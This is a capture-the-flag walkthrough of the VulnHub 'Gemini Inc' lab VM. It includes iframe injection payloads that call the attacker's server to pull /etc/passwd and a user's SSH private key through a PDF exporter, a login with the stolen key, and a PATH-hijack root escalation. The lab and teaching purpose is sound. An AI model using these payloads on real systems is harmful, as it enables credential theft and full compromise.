<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack The Gemini Inc (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-gemini-inc-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-06-26T06:20:13+00:00">June 26, 2018</time><time class="updated" datetime="2025-06-10T20:29:50+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Gemini Inc has contacted you to perform a penetration testing on one of their internal systems. This system has a web application that is meant for employees to export their profile to a PDF. Identify any vulnerabilities possible with the goal of complete system compromise with root privilege. To demonstrate the level of access obtained, please provide the content of flag.txt located in the root directory as proof.</span></p>
<p><span style="color: #000000;">Download it from<span style="color: #3366ff;"> <a style="color: #3366ff;" href="https://www.vulnhub.com/entry/gemini-inc-1,227/">here</a></span>.</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;">Scanning (Nmap)</span></li>
<li><span style="color: #000000;">Abusing web application for export injection vulnerability</span></li>
<li><span style="color: #000000;">Exploit web application via html iframe</span></li>
<li><span style="color: #000000;">Steal SSH RSA file</span></li>
<li><span style="color: #000000;">Access tty shell through ssh login</span></li>
<li><span style="color: #000000;">Enumerate file having SUID bit</span></li>
<li><span style="color: #000000;">Privilege Escalation</span></li>
<li><span style="color: #000000;">Get root shell</span></li>
<li><span style="color: #000000;">Complete the task and capture the Flag.txt</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s GO000!!!</strong></span></p>
<p><span style="color: #000000;">To scan our target IP we will use aggressive scan (-A)</span></p>
<pre class="lang:default decode:true ">nmap -p- -A 192.168.1.103 --open</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-M-hFD0A53cc/WzHYq_Rt9_I/AAAAAAAAXhU/cO0OqYyNCAIwPynhBvs1xtINFIu5G_VsQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As result, it figures out port 22 and 80 was open. Also found a directory <strong>/test2</strong> When explored target IP through the web browser it put up following web page as discussed.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_GumhUJ6n9M/WzHYs5kxF3I/AAAAAAAAXhs/zdBlJn0N6osew3x03-uKzDO45w-KEbMWQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then we explored <strong>/test2</strong> where we read the following message for admin and also look after at the URL given here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GSec7GT8PR4/WzHYtmdwmFI/AAAAAAAAXh8/F1Z3_IaoEeoLp3vQ08xjB7GzJkLvml3ZACEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Then at login form, we tried the hit-try method for login into the admin console and luckily at 5<sup>th</sup> attempt we get successful login when we submit following credential.</span></p>
<p><span style="color: #000000;"><strong>Username:</strong> admin</span></p>
<p><span style="color: #000000;"><strong>Password:</strong> 1234</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-CCHnAyVzIHM/WzHYuNz9-wI/AAAAAAAAXiA/vVllHjxWOzI5NvyPI17qcS2C99nNpjEQgCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">After login into admin console successfully we check available action that can be performed by the administrator and here it shows the following actions.</span></p>
<ul>
<li><span style="color: #000000;">Edit profile</span></li>
<li><span style="color: #000000;">Export profile</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fAlpxUvc5qc/WzHYuAlmizI/AAAAAAAAXiE/BsQUMlsR60YVO5L8imQ6kvSkXGD-eKVowCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">So we execute export profile to observe what is in actually it is exporting but could not figure out from its output as shown in below image, therefore, we decided to capture its request.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NU8n94qWZ5s/WzHYudYYslI/AAAAAAAAXik/0CCKH39PrAM5r43L8-fNQUAJtWbqcMUdACEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Further, with help of burp suit, we try to capture its browser request and sent the Intercepted request into the repeater and here I saw the export script possibly gave us the user profile page admin in PDF format by a tool named <strong>wkhtmltopdf</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-AAnPMbR1oAs/WzHYu37wlYI/AAAAAAAAXio/BpMAiUMwu8woec7Hju7q7QLgEqxPHCugACEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Security breaches if the web application does not filter the user’s input, the server is exposed to several loopholes  Because the most common exposures on the web, is the possibility to download an arbitrary file from a server. This state establishes a critical security issue, as it provides an attacker the ability to download delicate information from the server. For example download /etc/passwd file and so on.</span></p>
<p><span style="color: #000000;">We can abuse the wkhtmltopdf and try to download delicate information. Here we have written the following code for the index.php script that redirects to the any requested file. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8N9HGM69gME/WzHYvE6XybI/AAAAAAAAXis/0GIf8SZP-BIb786k1RQSMDZvFlrs7b3tQCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">In order to transfer it into the victim’s machine, therefore, we launch the PHP server for file transfer.</span></p>
<pre class="lang:default decode:true ">php -S 0.0.0.0:4444
</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-jn2KZAVNyZM/WzHYvXaiSBI/AAAAAAAAXiw/qmA1kqeAIZ0HQsNa4j8YqKL3X3HhBJnbwCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We got a hint for export injection from this source: <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://securityonline.info/export-injection-new-server-side-vulnerability/">https://securityonline.info/export-injection-new-server-side-vulnerability/</a> </span> and its on the basis we proceed for the following steps.</span></p>
<p><span style="color: #000000;">Now go with <strong>Action -&gt; edit profile </strong></span></p>
<p><span style="color: #000000;">Then injecting the following HTML code inside the text field given for the Display name </span></p>
<pre class="lang:default decode:true">&lt;iframe height="1000" width="800" src="http://192.168.1.108:4444/?file=/etc/passwd"&gt;&lt;/iframe&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u5b0yu1XLqI/WzHYqxTPN6I/AAAAAAAAXic/7bX4LTxmcqEcZ62U1tELZAVDyqyp0621ACEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now go with <strong>Action -&gt; export profile</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-wg6N3HxsI68/WzHYq-shNQI/AAAAAAAAXiY/x3xGEXWodOgbMfqIafDjaGyuCHSn6li9ACEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">TERRIFIC!!!! It stands on our expectation and we have /etc/passwd file in front of us.  here we can clearly observe <strong>UID GID 1000 </strong>for user:<strong> gemini1</strong>.  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-2Kid1vYoCZI/WzHYr_xzHWI/AAAAAAAAXis/mHiLtEI9Q3kJWBjc48F5pDfh8Y-XODThQCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">From nmap scan result we had seen there was a hint for SSH RSA key and we also knew the first username of this VM, therefore let’s try to export RSA file. </span></p>
<p><span style="color: #000000;">Now go with <strong>Action -&gt; edit profile </strong></span></p>
<p><span style="color: #000000;">Then injecting the following HTML code inside the text field given for the Display name </span></p>
<pre class="lang:default decode:true">&lt;iframe height="1000" width="800" src="http://192.168.1.108:4444/?file=/home/gemini1/.ssh/id_rsa"&gt;&lt;/iframe&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Wgf1L6-t59Y/WzHYr5KImUI/AAAAAAAAXig/T_0vWOKw36EtX1Si8DwtPbPt2g3-l_jPACEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now go with <strong>Action -&gt; export profile </strong></span></p>
<p><span style="color: #000000;">Feeling Incredible just after observing the following result, download it quickly.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BEgBokHlFxs/WzHYsDDyWwI/AAAAAAAAXio/TgGbraBogRkKt7TFNeRvl6h185Oi9vXLQCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">With help of downloaded RSA, file connects to victim’s VM via ssh.</span></p>
<pre class="lang:default decode:true ">ssh -i login_rsa gemini1@192.168.1.103</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-O3PXbAps5zc/WzHYs6bB2KI/AAAAAAAAXik/jzlVyUn07zka7KpySx1G5Ob6JLLCyV4RgCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Then without wasting your time search for the file having SUID or 4000 permission with help of Find command for post exploitation.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">Here we can also observe an interesting file/usr/bin/listinfo having suid permissions. And after exploring this file we notice it probably running netstat and date. Hence we can escalate privilege by exploiting environment PATH Variable, you can take help of our article from <a style="color: #000000;" href="http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/"><span style="color: #3366ff;">here</span></a> to know more about it. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-DDPFEXTNxc0/WzHYtPc8fCI/AAAAAAAAXic/1bdFQTduSPQOW922HqdXUl9xgFPQ5d7EgCEwYBhgL/s1600/17.png"/></span></p>
<pre class="lang:default decode:true ">cd /tmp
echo "/bin/sh" &gt; date
chmod 777 date
echo $PATH
export PATH=/tmp:$PATH
/usr/bin/listinfo</pre>
<p><span style="color: #000000;">As you can observe after that we execute id command and accomplished by root id.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ruMb8O5P4lI/WzHYtae2qUI/AAAAAAAAXiw/1IFlibixFCoHPUwYat8aXm5k8qXK4XcLQCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">As you can observe after that we execute id command and accomplished by root id. Now let’s finished this task by capturing the flag.txt flag from the inside root directory.</span></p>
<pre class="lang:default decode:true">cd root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-77UG680bV8s/WzHYtc5ZUSI/AAAAAAAAXig/Q6qBWLeicdULNzM7ZAVt1pLSO2C6QY2wACEwYBhgL/s1600/26.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
